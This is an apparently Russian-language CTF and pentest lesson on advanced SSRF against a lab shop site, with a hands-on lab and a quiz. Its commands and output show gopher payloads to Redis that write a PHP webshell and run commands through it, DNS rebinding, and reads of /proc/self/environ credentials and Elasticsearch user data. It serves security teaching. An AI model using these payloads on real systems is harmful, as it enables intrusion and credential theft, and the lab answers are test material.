---
id: web-ssrf-advanced
title: "SSRF: протоколы, DNS и serverless"
category: web
parent: web-ssrf
difficulty: easy
order: 2
tags: [ssrf, gopher, dns, serverless, roadmap]
prerequisites: [web-ssrf]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 8
summary: "Продвинутый уровень SSRF: контрабанда протоколов (gopher/dict), DNS rebinding и serverless."
lab:
  kind: shell
  title: "Практика: SSRF через gopher → Redis → RCE"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md, gopher.txt]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Схемы решают: file:// отклонён, а gopher://127.0.0.1:6379/_PING возвращает PONG."
    - "gopher передаёт сырые байты: в gopher.txt лежит Redis-payload (flushall + запись shell.php)."
    - "Отправь файл через --data-urlencode 'avatar_url@gopher.txt' — Redis сохранит webshell."
    - "Выполни curl -s 'https://shop.local/shell.php?cmd=cat /flag.txt' > found.txt — затем check."
---

## Задача

Базовый SSRF умеет ходить по HTTP. Но если сервер поддерживает другие **схемы URL**, можно говорить с внутренними сервисами на их языке — например, отправить команды в Redis. А если фильтр строгий — обойти его через **DNS rebinding**. В serverless-средах SSRF вообще выглядит иначе.

Разберём три продвинутых приёма.

## Наш пример: тот же загрузчик аватара

Вернёмся к параметру `avatar_url`. Проверим, какие схемы он принимает:

```bash
$ curl -s -d 'avatar_url=file:///etc/passwd' https://shop.local/profile/avatar
{"error":"unsupported_scheme"}
$ curl -s -d 'avatar_url=gopher://127.0.0.1:6379/_PING' https://shop.local/profile/avatar
{"status":"ok","saved":"PONG"}
```

`file://` отклонён, а `gopher://` прошёл — и вернул `PONG` от Redis. Значит, мы можем **отправлять произвольные байты** во внутренние TCP-сервисы. Это **контрабанда протоколов**.

> **Gopher** — URL-схема, позволяющая передать сырые байты на указанный хост:порт. В связке с SSRF это универсальный «клиент» для любого TCP-протокола (Redis, MySQL, SMTP).

## Шаг 1: SSRF → RCE через gopher и Redis

Redis часто слушает без пароля. Через gopher можно выполнить любую команду Redis. Классика — записать веб-шелл:

```bash
# формируем gopher-payload: команды Redis через CRLF
$ python3 gopherus.py --exploit redis
# получаем: gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall...
$ curl -s -d 'avatar_url=gopher://127.0.0.1:6379/_<payload>' https://shop.local/profile/avatar
```

Payload прописывает `dir` и `dbfilename` так, чтобы Redis записал PHP-шелл в веб-каталог:

```bash
$ curl -s https://shop.local/shell.php?cmd=id
uid=33(www-data) gid=33(www-data)
```

SSRF через gopher превратился в **RCE**. Именно поэтому «схема URL» — критичный параметр SSRF.

## Шаг 2: dict и другие схемы

Кроме gopher, полезны:

- **`dict://`** — отправка простых команд (`dict://127.0.0.1:6379/INFO`), удобна для Redis/сервисов без сложного протокола.
- **`file://`** — чтение локальных файлов (если не отклонён).
- **`ldap://`**, **`tftp://`** — реже, но встречаются.

```bash
$ curl -s -d 'avatar_url=dict://127.0.0.1:6379/INFO' https://shop.local/profile/avatar
# server:redis_version:6.0.9
```

Чем больше схем поддерживает HTTP-клиент сервера, тем шире атака.

## Шаг 3: DNS rebinding — обход строгого фильтра

Если сервер проверяет разрешённый IP и только потом делает запрос, между проверкой и запросом есть зазор. **DNS rebinding** этим пользуется: наш домен сначала резолвится в безопасный IP (проходит проверку), а через секунду — в `127.0.0.1`.

```bash
# our-dns отвечает: 1-й запрос -> 203.0.113.5 (наш IP, "безопасно")
#                  2-й запрос -> 127.0.0.1 (цель)
$ curl -s -d 'avatar_url=http://rebind.our-domain.com/' https://shop.local/profile/avatar
{"status":"ok","saved":"internal"}
```

Сервер проверил первый резолв, а запрос ушёл на второй. Инструменты: `rebind.network`, свой DNS с малым TTL. Защита — резолвить один раз и использовать тот же IP, либо блокировать приватные диапазоны после резолва.

## Шаг 4: SSRF в serverless

В serverless (Lambda, Cloud Functions) нет классической внутренней сети, но SSRF всё равно опасен:

- **`/proc/self/environ`** и переменные окружения содержат креды (ключи, токены).
- **Метаданные роли** доступны по тому же `169.254.169.254` (или через `AWS_CONTAINER_CREDENTIALS_*`).
- **Внутренние API** облачного провайдера (KMS, S3) доступны по служебным адресам.

```bash
$ curl -s -d 'avatar_url=file:///proc/self/environ' https://func.shop.local/fetch
AWS_LAMBDA_FUNCTION_NAME=fetch
DB_PASSWORD=...
```

Проверка та же: подставь внутренние адреса и `file://`.

## Шаг 5: как искать продвинутый SSRF

- **Схемы:** проверь `file`, `gopher`, `dict`, `ldap` — что принимается.
- **Внутренние порты:** найди Redis/MySQL/Elasticsearch и подбери gopher-payload.
- **Обход IP-фильтра:** альтернативные записи, редирект, DNS rebinding.
- **Serverless:** пробуй `file:///proc/self/environ` и метаданные.
- **Инструменты:** `Gopherus`, `SSRFmap`, Interactsh для blind.

## Если не сработало

- **Только http/https** — используй редирект и DNS rebinding, чтобы обойти проверку схемы.
- **Redis с паролем** — ищи пароль в конфиге или других утечках.
- **Нет веб-каталога для записи** — используй другие Redis-трюки (модули, cron через `dir=/var/spool/cron`).
- **Фильтр после резолва** — DNS rebinding с малым TTL; резолв повторяется.

## Что мы теперь знаем

- SSRF опасен не только HTTP: gopher/dict дают доступ к любому TCP-сервису.
- Gopher + Redis = RCE (запись веб-шелла или cron).
- DNS rebinding обходит проверку IP, разводя проверку и запрос по времени.
- В serverless цель — переменные окружения и метаданные роли.

## Частые вопросы

**Почему gopher так опасен?** Он позволяет передать **сырые байты** на любой хост:порт — то есть говорить на языке любого TCP-сервиса (Redis, MySQL, SMTP). В связке с SSRF это универсальный клиент.

**Всегда ли Redis даёт RCE?** Если он без пароля и есть куда писать (веб-каталог, cron). Иначе ищи другие сервисы или пароль в конфигах.

**DNS rebinding — это сложно?** Сама идея простая (домен меняет IP между проверкой и запросом), но нужен свой DNS с малым TTL. Инструменты упрощают.

**В serverless SSRF не работает?** Работает: цель меняется на переменные окружения и метаданные роли, но принцип тот же.

**Как защититься?** Белый список доменов/схем, резолв один раз с проверкой диапазона, запрет приватных IP и нестандартных схем, изоляция метаданных.

**Что если только http/https?** Обходи через редирект и DNS rebinding — тогда схема остаётся разрешённой, а адрес — внутренним.

## Ещё один сценарий: SSRF в Elasticsearch

Если внутренний сервис — Elasticsearch (порт 9200), через SSRF его можно читать и даже менять данные. Проверим:

```bash
$ curl -s -d 'avatar_url=http://127.0.0.1:9200/_cat/indices?v' https://shop.local/profile/avatar
green open users   5 1 1000 0 1.2mb 600kb
green open orders  5 1 5000 0 3.4mb 1.7mb
```

Читаем индекс `users`:

```bash
$ curl -s -d 'avatar_url=http://127.0.0.1:9200/users/_search?q=password' https://shop.local/profile/avatar
{"hits":{"hits":[{"_source":{"user":"admin","password":"..."}}]}}
```

Через POST (если метод сохраняется) можно и записать данные. Elasticsearch без авторизации — частая внутренняя цель.

## На что смотреть дальше

- **Схемы.** `gopher` (сырые байты), `dict`, `file`, `ldap` — что принимается.
- **Внутренние сервисы.** Redis (6379), Elasticsearch (9200), MySQL (3306).
- **Gopher → RCE.** Redis без пароля → запись шелла/cron.
- **DNS rebinding.** Обход проверки IP (разрыв во времени).
- **Serverless.** `/proc/self/environ`, переменные окружения, метаданные роли.
- **Инструменты.** `Gopherus`, `SSRFmap`, Interactsh.

## Квиз

Проверь себя.

```quiz
- question: "Что позволяет схема gopher в SSRF?"
  options:
    - "Передавать сырые байты на произвольный хост:порт (любой TCP-протокол)"
    - "Читать только HTTP"
    - "Шифровать трафик"
    - "Обходить CSP"
  answer: 0
  explanation: "Gopher — универсальный клиент TCP: через него говорят с Redis, MySQL, SMTP."
- question: "Как SSRF через gopher превращается в RCE?"
  options:
    - "Через Redis записать веб-шелл в каталог сайта"
    - "Через XSS украсть cookie"
    - "Через JWT подделать роль"
    - "Через LFI прочитать файл"
  answer: 0
  explanation: "Redis без пароля позволяет записать PHP-файл в веб-корень — это RCE."
- question: "Как работает DNS rebinding?"
  options:
    - "Домен резолвится сначала в безопасный IP, потом в 127.0.0.1"
    - "WAF отключается"
    - "Cookie подделывается"
    - "Порт сканируется"
  answer: 0
  explanation: "Проверка видит безопасный IP, а запрос уходит на внутренний — разрыв во времени."
- question: "Что искать при SSRF в serverless?"
  options:
    - "Переменные окружения (/proc/self/environ) и метаданные роли"
    - "Только localhost:80"
    - "Только DNS"
    - "Только cookie"
  answer: 0
  explanation: "В serverless нет внутренней сети, но креды лежат в окружении и метаданных."
```

## Куда дальше

На этом ветвь SSRF завершена. Дальше — серверное шаблонирование (`web-ssti`). А пока главное запомни: **SSRF растёт с числом поддерживаемых схем, а строгий фильтр обходится DNS rebinding.**

## Где пригодится

- **CTF:** закрепление темы в задачах категории Web.
- **Bug bounty:** приоритизация находок и построение отчётов.
- **Пентест:** планирование этапов тестирования веб-приложения.
- **Работа:** понимание, какие классы багов критичны для защиты продукта.
